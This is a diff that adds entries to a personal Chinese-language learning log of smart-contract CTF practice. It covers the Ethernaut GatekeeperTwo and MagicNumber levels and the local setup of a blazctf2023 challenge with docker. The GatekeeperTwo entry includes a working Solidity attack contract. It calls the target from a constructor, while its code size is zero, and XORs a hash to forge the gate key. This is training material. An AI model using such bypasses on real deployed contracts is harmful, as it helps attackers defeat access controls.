@@ -395,4 +395,47 @@ contract AttackGatekeeperOne {
 }
 ```
 
+### 2024.09.16
+#### Ethernaut - GateKeeper Two
+和 GateKeeper One 类似，需要过几个关卡
+关卡1: 要求使用合约来调用 enter 方法
+关卡2: 可以在合约的 constructor 方法中调用目标合约，这时候它还没有完成实例化，代码大小为 0
+关卡3: 学习如何进行异步运算
+实例地址：0x50d7242F965a27b97d15312b5370aF71079C1113
+```
+contract AttackGatekeeperTwo {
+    constructor() {
+        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));
+        address gateAddr = 0x50d7242F965a27b97d15312b5370aF71079C1113;
+        GatekeeperTwo(gateAddr).enter(_gateKey);
+    }
+}
+```
+### 2024.09.17
+#### blazctf2023 - rock scissor paper
+今天开始了解 blazctf 活动如何参加，尝试部署题目的环境
+1. 启动 基础服务器。需要注意网络问题
+```
+cd infrastucture/paradigmctf.py
+docker-compose up -d
+```
+2. 启动题目相关的容器
+```
+cd challenges/rock-paper-scissor/challenge
+docker-compose up -d
+nc localhost 1337 
+# 输入1创建题目实例
+# 提示找不到 ghcr.io/foundry-rs/foundry:latest
+docker pull --platform linux/amd64  ghcr.io/foundry-rs/foundry:latest
+docker tag ghcr.io/foundry-rs/foundry:latest foundry:latest
+nc localhost 1337 # 再次创建，成功。得到相关的 rpc 地址
+```
+3. 部署 blockscout。目前部署还有些问题，明天来解决
+
+### 2024.09.18
+#### ethernaut - MagicNumber
+这道题考查对字节码的使用，不是很懂，去查询了相关文档
+实例地址：0x08557A8d841ad88Eff166c08E1388dCbB1681bc1
+发现字节码还是很厉害的
+
 <!-- Content_END -->
